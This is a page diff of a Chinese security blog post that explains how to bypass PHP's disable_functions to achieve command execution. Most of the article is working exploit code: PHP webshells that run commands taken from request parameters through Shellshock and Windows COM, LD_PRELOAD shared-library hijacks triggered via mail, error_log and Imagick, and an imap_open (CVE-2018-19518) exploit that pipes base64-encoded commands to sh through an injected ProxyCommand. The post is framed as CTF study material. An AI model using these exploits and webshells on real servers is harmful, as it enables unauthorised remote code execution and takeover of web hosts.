@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  
+  <title>Bypass disable_functions - Sla，当你走了，我发誓不会堕落</title>
+  <meta charset="UTF-8">
+  <meta name="description" content="">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+
+  <link rel="shortcut icon" href="/images/avatar.png" type="image/png" />
+  <meta name="description" content="disable functions 绕过的几种方法。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bypass disable_functions">
+<meta property="og:url" content="http:&#x2F;&#x2F;stao.site&#x2F;posts&#x2F;c7b22821.html">
+<meta property="og:site_name" content="Sla，当你走了，我发誓不会堕落">
+<meta property="og:description" content="disable functions 绕过的几种方法。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;26&#x2F;S3hFkmEueYid6cP.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;bypass&#x2F;bypass&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;bypass&#x2F;bypass&#x2F;2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;bypass&#x2F;bypass&#x2F;3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;bypass&#x2F;bypass&#x2F;4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;bypass&#x2F;bypass&#x2F;5.png">
+<meta property="article:published_time" content="2020-01-05T12:00:08.624Z">
+<meta property="article:modified_time" content="2020-01-06T16:56:38.775Z">
+<meta property="article:author" content="Stao">
+<meta property="article:tag" content="命令执行">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;26&#x2F;S3hFkmEueYid6cP.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
+   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
+  <link rel="stylesheet" href="/css/style.css?v=1578330154632">
+<meta name="generator" content="Hexo 4.1.1"></head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div id="nexmoe-background">
+    <div class="nexmoe-bg" style="background-image: url(https://i.loli.net/2019/01/13/5c3aec85a4343.jpg)"></div>
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="Stao" class="mdui-btn mdui-btn-icon"><img src="/images/avatar.png"></a>
+       </div>
+    </div>
+  </div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="Stao">
+            <img src="/images/avatar.png" alt="Stao">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>7</div>
+        <div><span>标签</span>8</div>
+        <div><span>分类</span>2</div>
+    </div>
+    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博客
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+    </ul>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">社交按钮</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://github.com/ctfer-Stao" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/CTF/">CTF</a>
+          <span class="category-list-count">3</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/web/">web</a>
+          <span class="category-list-count">4</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">标签云</h3>
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud">
+      <a href="/tags/base64/" style="font-size: 10px;">base64</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">php反序列化</a> <a href="/tags/readflag/" style="font-size: 10px;">readflag</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql注入</a> <a href="/tags/web/" style="font-size: 20px;">web</a> <a href="/tags/xxe/" style="font-size: 13.33px;">xxe</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 16.67px;">命令执行</a>
+    </div>
+    
+  </div>
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2020 Stao
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+        <img src="http://img5.imgtn.bdimg.com/it/u=4103888617,3742418678&fm=26&gp=0.jpg">
+        
+        <h1>Bypass disable_functions</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2020年01月05日</a>
+    <a><i class="nexmoefont icon-areachart"></i>2.7k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 12 分钟</a>
+    
+      <a class="nexmoefont icon-appstore-fill -link" href="/categories/web/">web</a>
+    
+    
+      <a class="nexmoefont icon-tag-fill -link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a>
+    
+  </div>
+  <article>
+    <p>disable functions 绕过的几种方法。</p>
+<a id="more"></a>
+<h1 id="disable-functions简介"><a href="#disable-functions简介" class="headerlink" title="disable_functions简介"></a>disable_functions简介</h1><p>PHP配置文件中的disable_functions选项，用于禁用一些危险函数，可用户自定义。</p>
+<h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><pre><code>assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,``</code></pre><p>看看 php.ini 中的 disable_function 漏过了哪些函数，若存在漏网之鱼，直接利用即可</p>
+<h1 id="Imagetragick-命令执行漏洞"><a href="#Imagetragick-命令执行漏洞" class="headerlink" title="Imagetragick 命令执行漏洞"></a>Imagetragick 命令执行漏洞</h1><p>若imagetragick版本低于6.9.3-10,可以考虑它之前爆出的命令执行漏洞。poc:<a href="https://github.com/vulhub/vulhub/blob/master/imagemagick/imagetragick/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/imagemagick/imagetragick/README.zh-cn.md</a><br>相关文章:<a href="https://www.cnblogs.com/bmjoker/p/9898590.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9898590.html</a></p>
+<h1 id="Bash破壳漏洞（CVE-2014-6271）"><a href="#Bash破壳漏洞（CVE-2014-6271）" class="headerlink" title="Bash破壳漏洞（CVE-2014-6271）"></a>Bash破壳漏洞（CVE-2014-6271）</h1><p>学习文章：<a href="https://www.guildhab.top/?p=1805" target="_blank" rel="noopener">https://www.guildhab.top/?p=1805</a><br>exp:</p>
+<pre><code>&lt;?php 
+
+function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 
+   $tmp = tempnam(&quot;.&quot;,&quot;data&quot;); 
+   putenv(&quot;PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1&quot;); 
+   // In Safe Mode, the user may only alter environment variableswhose names 
+   // begin with the prefixes supplied by this directive. 
+   // By default, users will only be able to set environment variablesthat 
+   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
+   // PHP will let the user modify ANY environment variable! 
+   mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&apos;t actuallysend any mail 
+   $output = @file_get_contents($tmp); 
+   @unlink($tmp); 
+   if($output != &quot;&quot;) return $output; 
+   else return &quot;No output, or not vuln.&quot;; 
+} 
+echo shellshock($_REQUEST[&quot;cmd&quot;]); 
+?</code></pre><h1 id="利用Windows系统组件COM绕过"><a href="#利用Windows系统组件COM绕过" class="headerlink" title="利用Windows系统组件COM绕过"></a>利用Windows系统组件COM绕过</h1><p>若PHP开启了com_dotnet扩展，则可以利用下面的exp:</p>
+<pre><code>&lt;?php
+$command = $_GET[&apos;cmd&apos;];
+$wsh = new COM(&apos;WScript.shell&apos;); // 生成一个COM对象　Shell.Application也能
+$exec = $wsh-&gt;exec(&quot;cmd /c&quot;.$command); //调用对象方法来执行命令
+$stdout = $exec-&gt;StdOut();
+$stroutput = $stdout-&gt;ReadAll();
+echo $stroutput;
+?&gt;</code></pre><p><img src="https://i.loli.net/2019/09/26/S3hFkmEueYid6cP.png" alt=""></p>
+<h1 id="LD-PRELOAD-putenv"><a href="#LD-PRELOAD-putenv" class="headerlink" title="LD_PRELOAD+putenv"></a>LD_PRELOAD+putenv</h1><p>第二种方法是利用LD_PRELOAD+putenv绕过。<br>首先认识下LD_PRELOAD<br>LD_PRELOAD是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。功能主要就是用来有选择性的载入不同动态链接库中的相同函数。举个例子：</p>
+<pre><code>/*
+  passwd.c 
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char **argv)
+{
+    char passwd[] = &quot;password&quot;;
+
+    if (argc &lt; 2) {
+        printf(&quot;usage: %s &lt;password&gt;\n&quot;, argv[0]);
+        return;
+    }
+
+    if (!strcmp(passwd, argv[1])) {
+        printf(&quot;Correct Password!\n&quot;);
+        return;
+    }
+
+    printf(&quot;Invalid Password!\n&quot;);
+}</code></pre><p>`</p>
+<pre><code>/* hack.c */
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int strcmp(const char *s1, const char *s2)
+{
+        printf(&quot;hack function invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;/n&quot;, s1, s2);
+        /* 永远返回0，表示两个字符串相等 */
+        return 0;
+
+}</code></pre><p>编译和生成动态链接程序,-o后面接要输出的文件名,-shared -fPIC是生成动态链接程序。</p>
+<pre><code>$ gcc -o verifypasswd passwd.c
+$ gcc -shared -fPIC -o hack.so hack.c</code></pre><p>/* 依次执行以下命令效果如下图 */</p>
+<pre><code>root@kali:~# ./passwd 123456
+Invalid Password!
+root@kali:~# export LD_PRELOAD=&quot;./hack.so&quot;
+root@kali:~# ./passwd 123456
+hack function invoked. s1=&lt;password&gt; s2=&lt;123456&gt;/nCorrect Password!</code></pre><p>*可以发现程序载入了我们重写的strcmp函数<br><img src="https://blog-1301050970.cos.ap-guangzhou.myqcloud.com/bypass/bypass/1.png" alt=""><br>通过这个例子应该不难理解LD_PRELOAD.</p>
+<p>再来认识下putenv.putenv在php用来设置临时服务器环境变量</p>
+<pre><code>putenv ( string `$setting` ) : bool （添加 `setting` 到服务器环境变量。）</code></pre><p>环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。（简单来说就是临时的环境变量修改，脚本运行结束时恢复）</p>
+<h3 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h3><ul>
+<li>生成一个我们的恶意动态链接库文件</li>
+<li>利用putenv设置LD_PRELOAD为我们的恶意动态链接库文件的路径</li>
+<li>配合php的某个函数去触发我们的恶意动态链接库文件</li>
+<li>RCE</li>
+</ul>
+<p>这里面的某个函数需要在运行的时候能够启动子进程，这样才能重新加载我们所设置的环境变量，从而劫持子进程所调用的库函数。</p>
+<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>其中有不少函数可以满足，比如ImageMagick、mail、error_log</p>
+<ul>
+<li>当Imagick处理的文件是如下后缀的时候，就会调用外部程序ffmpeg去处理该文件</li>
+</ul>
+<pre><code>wmv,mov,m4v,m2v,mp4,mpg,mpeg,mkv,avi,3g2,3gp</code></pre><ul>
+<li>mail函数运行时，程序会启动子进程来调用sendmail<br><img src="https://blog-1301050970.cos.ap-guangzhou.myqcloud.com/bypass/bypass/2.png" alt=""></li>
+</ul>
+<p>strace -f用来跟踪目标进程,以及目标进程创建的所有子进程，2&gt;&amp;1是将标准输出重定向到标准输入，在父进程中fork一个子进程，在子进程中调用exec函数启动新的程序都是调用execve的库函数.</p>
+<ul>
+<li>当error_log的第二个参数 message_type 的值为 1 的时候，会调用mail 函数的同一个内置函数sendmail。<br><img src="https://blog-1301050970.cos.ap-guangzhou.myqcloud.com/bypass/bypass/3.png" alt=""></li>
+</ul>
+<h3 id="劫持子进程所调用的函数"><a href="#劫持子进程所调用的函数" class="headerlink" title="劫持子进程所调用的函数"></a>劫持子进程所调用的函数</h3><p>mail和error_log都调用了外部进程sendmail。<br>readelf -Ws /usr/sbin/sendmail查看senmail调用的函数，这里选择劫持getuid<br><img src="https://blog-1301050970.cos.ap-guangzhou.myqcloud.com/bypass/bypass/4.png" alt=""></p>
+<p>getuid.c</p>
+<pre><code>#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+void payload() {
+        system(&quot;ls &gt; test&quot;);
+}   
+int  geteuid() {
+if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; }
+unsetenv(&quot;LD_PRELOAD&quot;);
+payload();
+}</code></pre><p>(我们通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 unsetenv(“LD_PRELOAD”))</p>
+<p>生成动态链接程序</p>
+<pre><code>gcc -c  getuid.c -o get
+gcc --share -fPIC get -o get.so</code></pre><p>编写php脚本</p>
+<pre><code>&lt;?php
+putenv(&quot;LD_PRELOAD=./get.so&quot;);
+mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
+or
+putenv(&quot;LD_PRELOAD=./get.so&quot;);
+error_log(&apos;&apos;,1);
+?&gt;</code></pre><p>执行php文件,可以发现生成了test文件。</p>
+<h2 id="attribute-constructor"><a href="#attribute-constructor" class="headerlink" title="__attribute__((constructor))"></a>__attribute__((constructor))</h2><p>当然并不是所有系统都会安装sendmail的，这个时候就要用另外种bypass方法了。<br>首先介绍下__attribute__((constructor))。<br>GCC 有个 C 语言扩展修饰符__attribute__((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象(动态链接库)中时，那么一旦共享对象被系统加载，立即将执行__attribute__((constructor))修饰的函数。</p>
+<p>getuid.c</p>
+<pre><code>#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+__attribute__((constructor))void payload() {
+unsetenv(&quot;LD_PRELOAD&quot;);
+system(&quot;ls &gt; stao&quot;);
+}</code></pre><p>生成动态链接程序</p>
+<pre><code>gcc -c  getuid.c -o getuid
+gcc --share -fPIC getuid -o getuid.so</code></pre><p>编写php脚本</p>
+<pre><code>&lt;?php
+putenv(&quot;LD_PRELOAD=./getuid.so&quot;);
+mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
+or
+putenv(&quot;LD_PRELOAD=./getuid.so&quot;);
+error_log(&apos;&apos;,1);
+?&gt;</code></pre><p>执行php脚本，这样，就算没有sendmail，用__attribute__((constructor))修饰的函数依旧会执行，可以看到在生成的stao文件。</p>
+<p>从上述内容不难发现，我们必须找到一个能在运行时候启动子进程的函数才行，因为我们设置了环境变量，必须restart才能生效，所以如果能启动一个子进程，那么我们的设置的LD_PRELOAD就会加载我们的evil shared library. </p>
+<p>ps：大佬的exp:<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a><br>使用该项目的前提是mail没有过滤，该exp采用extern char<em>* environ来删除环境变量， 通过PHP putenv设置的环境变量来达到动态执行系统命令 const char</em> bashshell = getenv(“EVIL_CMDLINE”); 具体请自行查看。</p>
+<h2 id="利用ImageMagick"><a href="#利用ImageMagick" class="headerlink" title="利用ImageMagick"></a>利用ImageMagick</h2><p>如果php禁用了mail()函数,那怎么办呢? 除了用上述所说的error_log()还可以用上面提到的ImageMagick。<br>搭建环境可以参考这位师傅的文章：<a href="https://xz.aliyun.com/t/4623#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/4623#toc-4</a><br>前面有提到过，当Imagick处理的文件是如下后缀的时候，就会调用外部程序ffmpeg去处理该文件。</p>
+<pre><code>wmv,mov,m4v,m2v,mp4,mpg,mpeg,mkv,avi,3g2,3gp</code></pre><p>test.php</p>
+<pre><code>&lt;?php
+putenv(&quot;LD_PRELOAD=./poc.so&quot;);
+$img = new Imagick(&apos;img.mp4&apos;);//img.mp4文件必须存在，否则就会不去调用ffmpeg
+?&gt;</code></pre><p>poc.c</p>
+<pre><code>#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+__attribute__((constructor))void payload() {
+unsetenv(&quot;LD_PRELOAD&quot;);
+system(&quot;ls &gt; stao&quot;);
+}</code></pre><p>生成我们的动态链接程序</p>
+<pre><code>gcc -c -fPIC poc.c -o poc
+gcc --share poc -o poc.so</code></pre><p>执行PHP文件，可以看到生成stao文件。strace追踪可以看到调用了ffmpeg</p>
+<p><img src="https://blog-1301050970.cos.ap-guangzhou.myqcloud.com/bypass/bypass/5.png" alt=""></p>
+<h2 id="利用imap-open-CVE-2018-19518"><a href="#利用imap-open-CVE-2018-19518" class="headerlink" title="利用imap_open (CVE-2018-19518)"></a>利用imap_open (CVE-2018-19518)</h2><p>php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。<br>因为ssh命令中可以通过设置-oProxyCommand=来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p>
+<h3 id="ssh的-oProxyCommand-参数"><a href="#ssh的-oProxyCommand-参数" class="headerlink" title="ssh的-oProxyCommand 参数"></a>ssh的-oProxyCommand 参数</h3><p>SSH 命令中用到了许多命令，其中我们可以使用 -o 参数来设置连接期间可用的各种选项。在建立SSH连接之前，我们可以设置 ProxyCommand 参数，如下所示：</p>
+<pre><code>root@kali:~# ssh -oProxyCommand=&quot;touch test.txt&quot; 192.168.1.123
+kex_exchange_identification: Connection closed by remote host
+root@kali:~# ls</code></pre><p>可以发现即使是ssh连接失败了，但是命令还是执行了。</p>
+<p>漏洞代码：</p>
+<pre><code>&lt;?php
+if(!empty($_POST)) {
+    $imap = @imap_open(&apos;{&apos;.$_POST[&apos;hostname&apos;].&apos;:993/imap/ssl}INBOX&apos;, $_POST[&apos;username&apos;], $_POST[&apos;password&apos;]);
+}    
+?&gt;</code></pre><p>利用exp：</p>
+<pre><code>/* exp */
+&lt;?php
+error_reporting(0);
+if (!function_exists(&apos;imap_open&apos;)) {
+die(&quot;no imap_open function!&quot;);
+}
+$server = &quot;x -oProxyCommand=echo\t&quot; . base64_encode($_GET[&apos;cmd&apos;] . &quot;&gt;/tmp/cmd_result&quot;) . &quot;|base64\t-d|sh}&quot;;
+//$server = &apos;x -oProxyCommand=echo$IFS$()&apos; . base64_encode($_GET[&apos;cmd&apos;] . &quot;&gt;/tmp/cmd_result&quot;) . &apos;|base64$IFS$()-d|sh}&apos;;
+imap_open(&apos;{&apos; . $server . &apos;:143/imap}INBOX&apos;, &apos;&apos;, &apos;&apos;); // or var_dump(&quot;\n\nError: &quot;.imap_last_error());
+sleep(5);
+echo file_get_contents(&quot;/tmp/cmd_result&quot;);
+?&gt;</code></pre><h2 id="利用PHP-7-4-FFI绕过"><a href="#利用PHP-7-4-FFI绕过" class="headerlink" title="利用PHP 7.4 FFI绕过"></a>利用PHP 7.4 FFI绕过</h2><p>FFI扩展已经通过RFC，正式成为PHP 7.4核心扩展。</p>
+<p>什么是FFI<br>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。</p>
+<p>FFI的使用非常简单，只用声明和调用两步就可以，对于有C语言经验，但是不了解Zend引擎的程序员来说，这简直是打开了新世界的大门，可以快速地使用C类库进行原型试验。</p>
+<p>RCTF2019-Web-nextphp 就是利用了这个来绕过，可以通过这道题学习下。<br><a href="http://stao.site/posts/eb3c7b7e.html">http://stao.site/posts/eb3c7b7e.html</a></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总的来说，有三种绕过 disable_functions 的手法：第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；第二种，寻找未禁用的漏网函数，逐一尝试，或许有漏网之鱼；第三种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。此外，绕过了disable_functions同时也就绕过了open basedir.<br>最后推荐一个github项目，一个各种方式突破Disable_functions达到命令执行的shell。<br><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.smi1e.top/php-bypass-disabled_functions/" target="_blank" rel="noopener">https://www.smi1e.top/php-bypass-disabled_functions/</a><br><a href="https://www.evi1.cn/post/bypass_disable_func/" target="_blank" rel="noopener">https://www.evi1.cn/post/bypass_disable_func/</a><br><a href="https://www.anquanke.com/post/id/175403#h2-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175403#h2-5</a></p>
+
+  </article>
+  
+    
+<div class="nexmoe-post-copyright">
+<i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+<strong>本文作者：</strong>Stao<br>
+<strong>本文链接：</strong><a href="http://stao.site/posts/c7b22821.html" title="http:&#x2F;&#x2F;stao.site&#x2F;posts&#x2F;c7b22821.html" target="_blank" rel="noopener">http:&#x2F;&#x2F;stao.site&#x2F;posts&#x2F;c7b22821.html</a><br>
+
+  <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+
+</div>
+
+
+  
+  <section class="nexmoe-comment">
+    <div class="valine"></div>
+<script src='https://cdn.jsdelivr.net/npm/valine@1.3.9/dist/Valine.min.js'></script>
+<script>
+    // 使用方法 https://valine.js.org/quickstart.html
+    new Valine({
+        el: '.valine',
+        appId: 'U6bjcH3nqE46nXLkozomi6Fq-gzGzoHsz',
+        appKey: 'gXsdLMIoOKAg7tcJ8a76J02l'
+    })
+</script>
+</section>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+ 
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+ 
+    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="/js/app.js?v=1578330154635"></script>
+<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>
+
+
+
+  
+
+
+
+
+
+</body>
+
+</html>
